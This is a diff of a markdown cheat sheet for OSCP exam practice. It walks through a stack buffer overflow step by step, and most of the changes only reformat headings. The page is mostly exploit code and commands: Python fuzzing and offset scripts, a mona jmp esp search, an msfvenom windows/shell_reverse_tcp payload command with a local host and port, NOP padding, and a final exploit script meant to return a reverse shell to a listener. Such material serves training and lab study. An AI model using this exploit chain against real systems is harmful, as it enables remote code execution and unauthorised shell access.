@@ -7,11 +7,11 @@ title : muzec - Buffer Overflow Cheat Sheet
 
 Buffer Overflow Cheat Sheet, Simple Method To Follow For Your OSCP Exams......
 
-1. Confirming Vulnerable-apps to make sure shell connection is active and test the function for buffer storing
+### CONFIRMING VULNERABLE-APPS TO MAKE SURE SHELL CONNECTION IS ACTIVE, TEST THE FUNCTION FOR BUFFER STORING:-
 
 ```nc <target_ip> <port>```
       
-2. Fuzzing
+### FUZZING
 
 ```
 #!/usr/bin/env python3
@@ -43,7 +43,7 @@ while True:
 ```
 
 
-3. Using Pattern_create.rb with the Bytes Output From Fuzzer For Crash Replication & Controlling EIP
+### USING PATTERN_CREATE.rb WITH THE BYTES OUTPUT FROM FUZZER FOR CRASH REPLICATION & CONTROLLING EIP:-
 
 ![image](https://imgur.com/DkAPDgS.png)
 
@@ -55,7 +55,7 @@ import socket
 ip = "10.10.136.142"
 port = 1337
 
-prefix = "OVERFLOW5 "
+prefix = "OVERFLOW1 "
 offset = 0
 overflow = "A" * offset
 retn = ""
@@ -84,7 +84,7 @@ import socket
 ip = "10.10.136.142"
 port = 1337
 
-prefix = "OVERFLOW5 "
+prefix = "OVERFLOW1 "
 offset = 314
 overflow = "A" * offset
 retn = "BBBB"
@@ -105,7 +105,7 @@ except:
   print("Could not connect.")
 ```
 
-4. Finding Bad Characters
+### FINDING BAD CHARACTERS
 
 Let Create a working Directory First
 ```
@@ -129,7 +129,7 @@ import socket
 ip = "10.10.136.142"
 port = 1337
 
-prefix = "OVERFLOW5 "
+prefix = "OVERFLOW1 "
 offset = 314
 overflow = "A" * offset
 retn = "BBBB"
@@ -160,7 +160,7 @@ Not all of these might be badchars! Sometimes badchars cause the next byte to ge
 The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others.
 
 
-5. Finding a Jump Point
+### FINDING A JUMP POINT:-
 
 ```!mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd"```
 
@@ -170,19 +170,19 @@ This command finds all "jmp esp" (or equivalent) instructions with addresses tha
 
 Now setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.
 
-6. Generate Payload
+### GENERATE PAYLOAD:-
 
 ```msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "x00\x16\x2f\xf4\xfd" -f py```
 
 ![Image](https://imgur.com/pkBLv0u.png)
 
-7. Prepend NOPs
+### PREPEND NOPS:-
 
 Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:
 
 ```padding = "\x90" * 16```
 
-8. Our Final Exploit!
+### OUR FINAL EXPLOIT! 
 
 ```
 #!/usr/bin/env python2
@@ -230,7 +230,7 @@ buf += "\n"
 s.send(buf)
 ```
 
-NOTE:- Are You Confuse How i Got The ```"\xaf\x11\x50\x62"``` I Change One Of The Pointer I Got ```625011AF``` To Be Written Backwards And Why Is That?? Because The System Is Little Endian
+NOTE:- Are You Confuse How i Got The ```"\xaf\x11\x50\x62"``` I Change One Of The Pointer I Got ```625011AF``` To Be Written Backwards And Why Is That?? Because The System Is Little Endian.
 
 If we have everything correct running the exploit should give us a reverse shell back to our ncat listner.
 
